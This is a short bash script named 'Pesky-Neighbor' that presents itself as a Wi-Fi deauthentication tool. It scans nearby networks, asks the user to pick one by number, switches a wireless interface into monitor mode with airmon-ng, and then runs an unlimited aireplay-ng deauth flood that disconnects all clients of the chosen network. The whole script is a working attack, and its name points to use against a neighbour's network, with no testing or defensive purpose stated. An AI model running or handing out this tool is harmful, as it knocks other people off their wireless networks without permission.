#!/bin/bash
clear

echo "
=============================================================
Script: Pesky-Neighbor
Description: Deauth tool
Author: YAKM0
Email: YAKM0@pm.me
Twitter: @Y4KM0
=============================================================
"

mon='mon'
sleep 5
clear

# List available Wi-Fi networks and save to input.txt
nmcli dev wifi | awk '$2 != "--"' | awk '{print NR,$1,$2,$4}' | awk -F : '$2!="" && $3!=""' > input.txt

echo "========================================================================================"
nmcli dev wifi | awk '$2 != "--"' | awk '{print NR,$1,$2,$4}' | awk -F : '$2!="" && $3!=""'
echo "========================================================================================"

# Select a network to deauthenticate
echo "Which network would you like to deauth? (type number on the left)"
read num
head -n $num input.txt | tail -1 > input2.txt
Bssid=$(awk '{print $2}' input2.txt)
chan=$(awk '{print $4}' input2.txt)
ssid=$(awk '{print $3}' input2.txt)

# Confirm network selection
while true; do
    read -p "You chose $ssid, is this correct? " answer
    case $answer in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done

clear
ifconfig

# Start an interface in managed mode
echo "You must start an interface in managed mode, ex. wlan0."
read interface
while true; do
    read -p "You chose $interface, is this correct? " answer
    case $answer in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done

sudo airmon-ng start $interface > /dev/null 2>&1
clear

# Perform deauthentication
sudo timeout 2s airodump-ng -d $Bssid -c $chan $interface$mon > /dev/null 2>&1
sudo aireplay-ng -0 0 -a $Bssid $interface$mon --ignore-negative-one
sleep 3

clear
echo "Returning to managed mode"
sleep 2
sudo airmon-ng stop $interface$mon > /dev/null 2>&1
rm -rf input*
